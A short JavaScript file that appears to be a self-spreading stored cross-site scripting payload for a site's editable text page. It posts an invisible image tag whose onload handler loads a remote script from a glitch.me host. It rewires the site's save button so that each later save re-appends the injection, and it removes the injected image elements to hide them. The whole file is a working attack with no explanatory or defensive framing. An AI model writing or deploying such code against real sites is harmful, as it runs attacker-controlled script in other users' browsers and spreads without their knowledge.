/*inject

function saveCustomText(text) {
    text = text.replaceAll('"', '\\"')

    var bleach = new XMLHttpRequest();
    var url = "/edit"
    var vars = "newText=" + text;
    bleach.open("POST", url, true)
    bleach.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    bleach.send(vars);
}

var str = `var s = document.createElement('script');s.src='https://dmdassc.glitch.me/static/sayanything/2.js';document.head.append(s)`;
saveCustomText(`<img width=0 id="dmdassc-img" src="/uploads/monkaw.png" onload="${str}" />`);

*/

function saveCustomText(text) {
    text = text.replaceAll('"', '\\"')

    const bleach = new XMLHttpRequest();
    const url = "/edit"
    const vars = "newText=" + text;

    bleach.open("POST", url, true)
    bleach.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    bleach.send(vars);
}

function getScriptText() {
    var str = `var s = document.createElement('script');s.src='https://dmdassc.glitch.me/static/sayanything/2.js';document.head.append(s)`;
    var text = `<img width=0 id="dmdassc-img" src="/uploads/monkaw.png" onload="${str}" />`;
    return text;
}

window["customSave"] = () => {
    const content = document.getElementById("editable").innerHTML; 
    const text = content + getScriptText();

    //console.log(`Saving: (${text})`)

    saveCustomText(text);

    window['getjson']();
    window['myFunction']();
}

document.querySelector(".save-button h2").onclick = window["customSave"];


document.querySelectorAll("#dmdassc-img").forEach(e => e.remove());